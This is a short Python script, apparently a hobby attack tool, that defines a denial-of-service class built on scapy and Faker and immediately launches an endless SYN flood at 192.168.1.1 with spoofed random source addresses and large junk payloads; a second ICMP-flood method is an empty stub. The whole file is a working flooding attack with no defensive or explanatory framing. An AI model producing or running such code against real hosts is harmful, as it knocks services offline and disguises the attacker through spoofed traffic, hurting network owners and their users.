from scapy.all import Ether, ICMP, TCP, IP, Raw, send
from faker import Faker

class DOS:
    def __init__(self, targetIP):
        self.target = targetIP

    def synFlood(self):   
        while True:
            fake = Faker()
            fakeIpAddr = fake.ipv4()
            
            packetStack = IP(dst = self.target, src = fakeIpAddr) / TCP(sport = 80, dport = 443, flags = "S")
            payload = Raw(b"X" * 57344)
            
            payloadPacket = packetStack / payload

            send(payloadPacket, verbose = 0)

    def icmpFlood(self):
        print("xx")

a = DOS("192.168.1.1")

a.synFlood()